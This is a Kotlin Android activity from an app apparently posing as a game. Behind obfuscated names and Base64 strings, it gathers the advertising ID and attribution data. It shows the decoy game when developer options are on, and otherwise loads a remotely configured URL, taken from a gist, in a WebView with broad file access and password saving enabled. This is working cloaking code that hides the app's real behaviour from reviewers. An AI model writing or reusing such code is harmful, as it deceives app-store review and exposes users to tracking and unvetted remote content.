package com.bw.lyukc

import android.annotation.SuppressLint
import android.annotation.TargetApi
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.*
import android.view.KeyEvent
import android.webkit.*
import androidx.appcompat.app.AppCompatActivity
import com.facebook.FacebookSdk
import com.onesignal.OneSignal
import kotlinx.android.synthetic.main.activity_main.*
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.OkHttpClient
import android.webkit.ValueCallback
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.gms.common.GooglePlayServicesNotAvailableException
import android.graphics.Bitmap
import android.provider.Settings
import android.util.Base64
import android.view.View
import android.webkit.WebView
import com.facebook.applinks.AppLinkData
import okhttp3.Request
import java.util.*
import com.bw.lyukc.Game.StartGameActivity

val diedevke = "hqawi6LurbkoTwaB4kqyL8"
@DelicateCoroutinesApi
class WL : AppCompatActivity() {
    private var progerProgreees: Progress? = null
    private val oneChhf = "OGVhOTI2MGYtMTZhMS00YWE1LTk4YjItMjRlNzEwNGQxY2Ex"
    private var MesSosfnjenghs: ValueCallback<Uri>? = null
    private var abibhfbhb: ValueCallback<Array<Uri>>? = null
    private val Code_Chosiiikksf = 10000
    var apqaetidd: String? = null
    var statqikq: String? = null
    var propara: String? = null
    lateinit var orgicaqhd: String
    var okTypy = "Y29tLmJ3Lmx5dWtjCg=="
    var Pachans = Pars()
    private lateinit var wesnikw: WebView
    var OhIDq: String? = null
    var LyuksDataf: String? = null
    var LopDeper: String? = null
    var highScore: String? = null
    private var Linkeleding: String? = null
    var Febechka: String? = null
    var devoIntkey: String? = null


    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        wesnikw = findViewById(R.id.webView)
        window.addFlags(1024)
        GlobalScope.launch {
            val infoaqrry: AdvertisingIdClient.Info?
            try {
                infoaqrry = AdvertisingIdClient.getAdvertisingIdInfo(applicationContext)
                OhIDq = infoaqrry!!.id
            } catch (e: GooglePlayServicesNotAvailableException) {
                e.printStackTrace()
            }
        }

        val listDataconegg = object : AppsFlyerConversionListener {

            override fun onConversionDataSuccess(dtaconser: Map<String, Any>) {
                for (attrechej in dtaconser.keys)
                    statqikq =
                        Objects.requireNonNull(dtaconser[pam("YWZfc3RhdHVz")]).toString()
                if (statqikq == pam("Tm9uLW9yZ2FuaWM=")) {
                    val sajfnaq: String =
                        Objects.requireNonNull(dtaconser[pam("Y2FtcGFpZ24=")]).toString()
                    propara = Pachans.AloneSearhLine(sajfnaq, OhIDq!!, apqaetidd!!)
                } else { }
            }
            override fun onConversionDataFail(p21412: String?) {}
            override fun onAppOpenAttribution(p64564: MutableMap<String, String>?) {}
            override fun onAttributionFailure(p12412: String?) {}
        }
        AppsFlyerLib.getInstance().waitForCustomerUserId(true);
        AppsFlyerLib.getInstance().init(diedevke, listDataconegg, this)
        AppsFlyerLib.getInstance().setCustomerIdAndLogSession(pam("Y3VzdG9tZXJfaWQ="), this)
        AppsFlyerLib.getInstance().start(this)
        apqaetidd = AppsFlyerLib.getInstance().getAppsFlyerUID(this)!!
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        OneSignal.setAppId(pam(oneChhf))
        val sharidqrkdfd = getPreferences(Context.MODE_PRIVATE)
        highScore = sharidqrkdfd.getString("key-214125", null)

        webView.webChromeClient = object : WebChromeClient() {
            override fun onShowFileChooser(
                webView: WebView,
                filePathCallback: ValueCallback<Array<Uri>>,
                fileChooserParams: WebChromeClient.FileChooserParams
            ): Boolean {
                abibhfbhb = filePathCallback
                openImageChooserActivity()
                return true
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView?, url: String, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
                if (url.contains(pam("NDA0"))) {
                    val iqctw = Intent(this@WL,StartGameActivity::class.java)
                    startActivity(iqctw)
                    finish()
                }
            }

            override fun onPageFinished(view: WebView, url: String?) {
                DialogSetProgjjjdq(false)
                super.onPageFinished(view, url)
                with(sharidqrkdfd.edit()) {
                    putString("key-214125", url)
                    apply()
                }
            }
        }
        if (DELOYNUM() == 0) {
            if (highScore != null) {
                loaberlowe(highScore.toString())
            } else {
                GlobalScope.launch {
                    getaisa()
                    Handler(Looper.getMainLooper()).postDelayed({
                        val idFAwq = Febechka.toString()
                        starqmafib(idFAwq)
                    }, 1500)
                    Handler(Looper.getMainLooper()).postDelayed({
                            startsiawuh(Linkeleding!!, devoIntkey!!, LopDeper, this@WL)
                    }, 5000)
                }
            }
        } else {
            startActivity(Intent(this, StartGameActivity::class.java))
            finish()
        }


    }
    private fun openImageChooserActivity() {
        val i = Intent(Intent.ACTION_GET_CONTENT)
        i.addCategory(Intent.CATEGORY_OPENABLE)
        i.type = "*/*"
        startActivityForResult(
            Intent.createChooser(i,pam("SW1hZ2UgQ2hvb3Nlcg==")), Code_Chosiiikksf)
    }

    override fun onActivityResult(per1: Int, coderes21: Int, darike13: Intent?) {
        super.onActivityResult(per1, coderes21, darike13)
        if (per1 == Code_Chosiiikksf) {
            if (null == MesSosfnjenghs && null == abibhfbhb) return
            val restikw = if (darike13 == null || coderes21 != Activity.RESULT_OK) null else {
                darike13.data
            }
            if (abibhfbhb != null) {
                resikabyeu(per1, coderes21, darike13)
            } else if (MesSosfnjenghs != null) {
                MesSosfnjenghs!!.onReceiveValue(restikw)
                MesSosfnjenghs = null
            }
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private fun resikabyeu(recodera1: Int, resika32: Int, inchere4: Intent?) {
        if (recodera1 != Code_Chosiiikksf || abibhfbhb == null)
            return
        var resiawq: Array<Uri>? = null
        if (resika32 == Activity.RESULT_OK) {
            if (inchere4 != null) {
                val dacnikqn = inchere4.dataString
                val ciapwnq = inchere4.clipData
                if (ciapwnq != null) {
                    resiawq = Array(ciapwnq.itemCount) { i ->
                        ciapwnq.getItemAt(i).uri
                    }
                }
                if (dacnikqn != null) resiawq = arrayOf(Uri.parse(dacnikqn))
            }
        }
        abibhfbhb!!.onReceiveValue(resiawq)
        abibhfbhb = null
    }

    override fun onKeyDown(ketas: Int, baowq: KeyEvent): Boolean {
        if (baowq.action == KeyEvent.ACTION_DOWN) {
            if (ketas == KeyEvent.KEYCODE_BACK) {
                if (webView.canGoBack()) { webView.goBack() }
                return true
            }
        }
        return super.onKeyDown(ketas, baowq)
    }

    private fun getaisa() {
        val reysjq = Request.Builder()
            .url(pam("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9TTUlEdk1ha3MvMDgzMTA3NTMxMWFhYjcwOTc2ZTI4NWMyODVlNjJkMDEvcmF3L2dpc3RmaWxlMS50eHQ="))
            .build()
        val cliajq = OkHttpClient()
        val sresposn: Response = cliajq.newCall(reysjq).execute()
        val bodersa = sresposn.body?.string()
        val spliwtq = bodersa?.split("|")?.toTypedArray()
        Linkeleding = spliwtq!![0]
        devoIntkey = spliwtq[1]
        Febechka = spliwtq[2]
    }

    private fun starqmafib(id: String) {
        FacebookSdk.setApplicationId(id)
        FacebookSdk.setAdvertiserIDCollectionEnabled(true)
        FacebookSdk.sdkInitialize(applicationContext)
        FacebookSdk.setAutoLogAppEventsEnabled(true)
        FacebookSdk.setAutoInitEnabled(true)
        FacebookSdk.fullyInitialize()
        AppLinkData.fetchDeferredAppLinkData(this) { appLinkData ->
            var DATAfbApYep = appLinkData
            if (DATAfbApYep == null) {
                DialogSetProgjjjdq(true)
                DATAfbApYep = AppLinkData.createFromActivity(this)
            }
            runOnUiThread {
                if (DATAfbApYep != null) {
                    DialogSetProgjjjdq(true)
                    val urikLoad = DATAfbApYep.targetUri
                    LyuksDataf = urikLoad?.query.toString()
                    LopDeper = Pachans.AloneSearhLine(LyuksDataf!!, OhIDq!!, apqaetidd!!)
                } else {
                }
            }
        }
    }

    fun startsiawuh(
        iasjq: String,
        yqisde: String,
        deplopasw: String?,
        activ: WL
    ) {
        if (statqikq.equals(Pachans.FbAppsIntro("Tm9uLW9yZ2FuaWM="))) {
            val maweyas = iasjq + propara
            loaberlowe(maweyas)
        } else if (deplopasw != null) {
            val oqhx = iasjq + deplopasw
            loaberlowe(oqhx)
        } else {
            if (yqisde == Pachans.FbAppsIntro("Tk8=")) {
                val iakqsd = Intent(activ, StartGameActivity::class.java)
                activ.startActivity(iakqsd)
            } else {
                orgicaqhd = yqisde + Pachans.FbAppsIntro("P2J1bmRsZT0=") + pam(okTypy) +
                        Pachans.FbAppsIntro("JmFkX2lkPQ==") + OhIDq + Pachans.FbAppsIntro("JmFwcHNfaWQ9") +
                        apqaetidd + Pachans.FbAppsIntro("JmRldl9rZXk9") + diedevke
                val oqbsa = iasjq + orgicaqhd
                loaberlowe(oqbsa)
            }
        }
    }
    @SuppressLint("SetJavaScriptEnabled")
    fun loaberlowe(urikea: String) {
        wesnikw.settings.apply {
            setAppCacheEnabled(true)
            allowFileAccessFromFileURLs = true
            saveFormData = true
            mixedContentMode = 0
            savePassword = true
            allowContentAccess = true
            setRenderPriority(WebSettings.RenderPriority.HIGH)
            setEnableSmoothTransition(true)
            loadsImagesAutomatically = true
            allowUniversalAccessFromFileURLs = true
            databaseEnabled = true
            loadWithOverviewMode = true
            useWideViewPort = true
            javaScriptCanOpenWindowsAutomatically = true
            domStorageEnabled = true
            allowFileAccess = true
            javaScriptEnabled = true
        }
        wesnikw.visibility = View.VISIBLE
        wesnikw.loadUrl(urikea)
    }

    private fun DialogSetProgjjjdq(visibleLOPEQ: Boolean) {
        GlobalScope.launch(newSingleThreadContext("MyThread")) {
            runOnUiThread {
                if (visibleLOPEQ) progerProgreees =
                    Progress(this@WL, R.string.please_wait, bolaq = true)
                progerProgreees?.apply { if (visibleLOPEQ) ckolel() else sakqdii() }
            }
        }
    }

    fun DELOYNUM(): Int {
        val devre: Int = Settings.Secure.getInt(this.contentResolver,
            Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0)
        return devre
    }

    fun pam(strrrr142: String): String {
        val fndsnsn = String(Base64.decode(strrrr142, Base64.DEFAULT))
        return fndsnsn
    }


}

